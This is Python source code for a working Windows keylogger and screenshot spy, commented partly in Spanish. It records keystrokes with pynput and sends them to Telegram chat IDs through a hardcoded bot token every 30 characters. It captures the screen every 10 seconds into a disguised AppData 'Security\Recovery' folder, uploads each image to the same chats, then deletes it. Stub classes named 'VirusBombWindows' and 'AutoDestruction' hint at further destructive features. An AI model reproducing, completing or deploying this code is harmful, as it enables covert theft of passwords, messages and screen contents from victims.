# import libs
from pynput.keyboard import Listener  # Escucha eventos del teclado
import os  # Lib para copiar archivos
#import socket  # Verifica internet
import threading  # procesos multihilos
from getpass import getuser  # Obtiene el nombre del usuario
from datetime import datetime  # Devuelve fecha y hora actual
from winreg import OpenKey, SetValueEx, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ, \
    HKEY_CURRENT_USER  # Modifica registros de Windows
import datetime  # Devuelve fecha y hora actual
import random  # Genera numeros
import telepot  # Telegram API
import shutil  # Lib para crear carpetas
import string  # Lib genera textos
import time  # Contar segundos
from PIL import ImageGrab  # Toma capturas de pantalla

#region Config
class Config:
    def __init__(self):
        self.USERNAME = str(os.getlogin())
        self.DELAY = 2  # Seconds
        self.DEBUG = True  # Show data in console

    class TelegramBot:
        def __init__(self):
            self.ID = [-1001322369309]  # or [11111111111, 222222222222, -3333333333333]
            self.TOKEN = "1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp8QM"

    class Keylogger:
        def __init__(self):
            self.ACTIVE = True
            self.LIMIT = 30  # Limit of letters # do not change

    class Screenshot:
        def __init__(self):
            self.ACTIVE = True
            self.PATH = r"C:\Users" +"\\" + Config().USERNAME + r"\AppData\Roaming\Microsoft\Windows\Security\Recovery\User" + "\\"
            self._NAME = "s5s6df45sdf456dsf4fds6fds"
            self.INTERVAL = 10  # seconds

#endregion

class Util:
    def create_folder(self,path):
        try:  # Intenta crear la dirección
            os.makedirs(path)
            print("[CreateFolders] Success create folder: " + path)
        except:
            print("[CreateFolders] Folder realy exist: " + path)

    def current_time(self):
        T = datetime.datetime.now()
        return T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
            "%I") + " " + T.strftime("%M") + " " + T.strftime("%p")

    def random_char(self, number=4):  # Genera letras aleatorias [Longitud según el argumento]
        return ''.join(random.choice(string.ascii_letters) for x in range(number))

class Screenshot:
    def _name(self):
        name = Config().USERNAME + " " + Util().current_time() + " " + Util.random_char(4)+ ".png"
        print("[Screenshot] File name: " + name) if Config().DEBUG else False

        return name
    def _take(self, name):
        ImageGrab.grab().save(Config().Screenshot().PATH + name)
        print("[ScreenShot] Take and save screenshot") if Config().DEBUG else False
    def _delete(self, name):
        try:
            os.remove(Config().Screenshot().PATH + name)
            print("[ScreenShot] Delete Sucess") if Config().DEBUG else False
        except:
            print("[ScreenShot] There was a mistake while erasing file") if Config().DEBUG else False

    def send(self):
        Util().create_folder(Config().Screenshot().PATH)
        while True:
            name = self._name()
            self._take(name)
            bot = telepot.Bot(Config.TelegramBot().TOKEN)
            for id in Config().TelegramBot().ID:
                try:
                    bot.sendChatAction(id, 'upload_photo')
                    bot.sendDocument(id, open(Config().Screenshot().PATH + name, 'rb'))
                    print("[SEND ScreenShot] Send keylogger to: [ID] " + str(id)) if Config().DEBUG else False
                except:
                    print("[SEND ScreenShot] there was a mistake when sending the [ID] " + str(id)) if Config().DEBUG else False
            self._delete(name)
            time.sleep(Config.Screenshot().INTERVAL)


class VirusBombWindows:
    def __init__(self):
        self.PATH_DESKTOP = r""
        self.PATH_PICTURE = r""
        self.PATH_VIDEO = r""
        self.PATH_DOWNLOAD = r""
        self.PATH_MUSIC = r""

class AutoDestruction:
    def __init__(self):
        pass

class Key:
    def __init__(self):
        self.buffer = ""

    def _send(self, reg_text):
        bot = telepot.Bot(Config().TelegramBot().TOKEN)
        for id in Config().TelegramBot().ID:
            try:
                bot.sendMessage(id, reg_text)
                print("[SEND TelegramBot] Send keylogger to: [ID] = " + str(id)) if Config().DEBUG else False
            except:
                print("[SEND TelegramBot] there was a mistake when sending the [ID] = " + str(id)) if Config().DEBUG else False

    def listen_key(self):
        def _key_min(numberKey):  # Caracteres Comunes // Optimizados
            switcher = {
                # Vocales Minisculas
                "'a'": "a",
                "'e'": "e",
                "'i'": "i",
                "'o'": "o",
                "'u'": "u",
                # Letras  Minusculas
                "'b'": "b",
                "'c'": "c",
                "'d'": "d",
                "'f'": "f",
                "'g'": "g",
                "'h'": "h",
                "'j'": "j",
                "'J'": "J",
                "'k'": "k",
                "'l'": "l",
                "'m'": "m",
                "'n'": "n",
                "'ñ'": "ñ",
                "'p'": "p",
                "'q'": "q",
                "'r'": "r",
                "'s'": "s",
                "'t'": "t",
                "'v'": "v",
                "'w'": "w",
                "'x'": "x",
                "'y'": "y",
                "'z'": "z",
                # Caracteres
                "','": ",",  # ,
                "'.'": ".",  # .
                "'_'": "_",  # _
                "'-'": "-",  # -
                "':'": ":",  #
                # Vocales Mayúsculas
                "'A'": "A",
                "'E'": "E",
                "'I'": "I",
                "'O'": "O",
                "'U'": "U",
                # Letras Mayúsculas
                "'B'": "B",
                "'C'": "C",
                "'D'": "D",
                "'F'": "F",
                "'G'": "G",
                "'H'": "H",
                "'K'": "K",
                "'L'": "L",
                "'M'": "M",
                "'N'": "N",
                "'Ñ'": "Ñ",
                "'P'": "P",
                "'Q'": "Q",
                "'R'": "R",
                "'S'": "S",
                "'T'": "T",
                "'V'": "V",
                "'W'": "W",
                "'X'": "X",
                "'Y'": "Y",
                "'Z'": "Z",
                # Números Standard
                "'1'": "1",
                "'2'": "2",
                "'3'": "3",
                "'4'": "4",
                "'5'": "5",
                "'6'": "6",
                "'7'": "7",
                "'8'": "8",
                "'9'": "9",
                "'0'": "0",
                # Caracteres Especiales
                "'@'": "@",  # @
                "'#'": "#",  # #
                "'*'": "*",  # *
                "'('": "(",  # (
                "')'": ")",  # )
                '"\'"': "'",  # '
                "'\"'": '"',  # "
                "'?'": "?",  # ?
                "'='": "=",  # =
                "'+'": "+",  # +
                "'!'": "!",  # !
                "'}'": "}",  # }
                "'{'": "{",  # {}
                "'´'": "´",  # ´
                "'|'": "|",  # |
                "'°'": "°",  # °
                "'^'": "¬",  # ^
                "';'": ";",  #
                "'$'": "$",  # $
                "'%'": "%",  # %
                "'&'": "&",  # &
                "'>'": ">",  #
                "'<'": "<",  #
                "'/'": "/",  # /
                "'¿'": "¿",  # ¿
                "'¡'": "¡",  # ¡
                "'~'": "~"  #
            }
            return switcher.get(numberKey, "")  # Convierte tecla a un valor legible

        def _key_max(numberKey):  # Botones, comunes // Optimizados
            switcher = {
                "Key.space": " ",  # Espacio
                "Key.backspace": "⋪",  # Borrar
                "Key.enter": "\n",  # Salto de linea
                "Key.tab": "    ",  # Tabulación
                "Key.delete": "❌",  # Suprimir
                # Números
                "<96>": "0",  # 0
                "<97>": "1",  # 1
                "<98>": "2",  # 2
                "<99>": "3",  # 3
                "<100>": "4",  # 4
                "<101>": "5",  # 5
                "<102>": "6",  # 6
                "<103>": "7",  # 7
                "<104>": "8",  # 8
                "<105>": "9",  # 9
                "<181>": "♪",  # Open Music ♪

                # Números Númeral
                "None<96>": "0",  # 0
                "None<97>": "1",  # 1
                "None<98>": "2",  # 2
                "None<99>": "3",  # 3
                "None<100>": "4",  # 4
                "None<101>": "5",  # 5
                "None<102>": "6",  # 6
                "None<103>": "7",  # 7
                "None<104>": "8",  # 8
                "None<105>": "9",  # 9
                # Teclas raras 2
                "['^']": "^",
                "['`']": "`",  #
                "['¨']": "¨",  #
                "['´']": "´",  #
                "<110>": ".",  #
                "None<110>": ".",  #
                "Key.alt_l": " ◀Alt ",  #
                "Key.alt_r": " Alt▶ ",
                "Key.shift_r": " Shift▶ ",
                "Key.shift": " ◀Shift ",
                "Key.ctrl_r": " Ctrl▶ ",  #
                "Key.ctrl_l": " ◀Ctrl ",  #
                "Key.right": "▶",  #
                "Key.left": "◀",  #
                "Key.up": "🔼",  #
                "Key.down": "🔽",  #
                # "'\x16'"  : " [Pegó] ",
                # "'\x18'"  : " [Cortar] ",
                # "'\x03'"  : " [Copiar] ",
                "Key.caps_lock": " 🔒⌨ ",
                "Key.num_lock" : " 🔒🔢 " ,
                "Key.media_previous"    : "⏮",
                "Key.media_next"        : "⏭",
                "Key.media_play_pause"  : "⏹",
                "Key.media_volume_mute" : "🔇",
                "Key.media_volume_up" : "🔊",
                "Key.media_volume_down" : "🔉",
                "Key.cmd": " ⊞ "
            }
            return switcher.get(numberKey, "")  # Convierte tecla a un valor legible
        # instance Obj Config
        config = Config()
        debug = config.DEBUG
        print("[KeyLogger] - Start OK") if debug else False

        def press(key):
            try:
                if (len(str(key))) <= 3:
                    temp = _key_min(str(key))  # Optimitation process and memory
                else:
                    temp = _key_max(str(key))  # Optimitation process and memory
                self.buffer = self.buffer + temp  # save keylogger in variable
                print("    " + str(key) + " <= [key press]=> " + temp) if debug else False
                print(self.buffer) if debug else False

                if len(self.buffer) >= config.Keylogger().LIMIT:
                    print("[KEYLOGGER] Reached or exceeded the limit  => " + str(len(self.buffer))) if debug else False
                    self._send(self.buffer)
                    self.buffer = ""
                else:
                    print("[KEYLOGGER] Current text length  => " + str(len(self.buffer))) if debug else False
            except:
                print("[KEYLOGGER] there was a mistake getting key ") if debug else False

        with Listener(on_press=press) as listener:
            listener.join()

if __name__ == '__main__':
    print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False

    threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
    threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
    #threading.Thread(target=VirusBombWindows().init).start() if Config().VirusBombWindows().ACTIVE else False
    #threading.Thread(target=AutoDestruction().init).start() if Config().AutoDestruction().ACTIVE else False
